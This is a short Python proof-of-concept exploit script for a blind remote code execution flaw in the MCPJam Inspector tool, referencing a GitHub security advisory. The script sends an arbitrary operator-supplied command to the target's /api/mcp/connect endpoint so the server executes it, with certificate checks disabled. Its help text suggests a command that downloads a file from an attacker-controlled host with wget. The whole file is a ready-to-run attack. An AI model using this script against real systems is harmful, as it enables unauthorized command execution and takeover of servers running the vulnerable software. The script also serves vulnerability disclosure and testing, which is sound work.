#!/usr/bin/env python3
import requests
import argparse

"""
MCPJam Blind RCE
https://github.com/MCPJam/inspector/security/advisories/GHSA-232v-j27c-5pp6
"""

def exploit(args):
        base_url = args.target.rstrip("/")
        url = f"{base_url}/api/mcp/connect"

        full_cmd = args.command.split()
        command = full_cmd[0]
        args = full_cmd[1:]

        post_data = {"serverConfig":{"command":command, "args":args, "env":{}},"serverId":"exploit"}
        req = requests.post(url, json=post_data, verify=False)
        print(req.text)

if __name__ == "__main__":
        parser = argparse.ArgumentParser()
        parser.add_argument("--target", required=True, help="Target e.g https://127.0.0.1")
        parser.add_argument("--command", required=True, help="Command to exec on remote target. e.g: wget http://YOU/f")
        args = parser.parse_args()
        exploit(args)
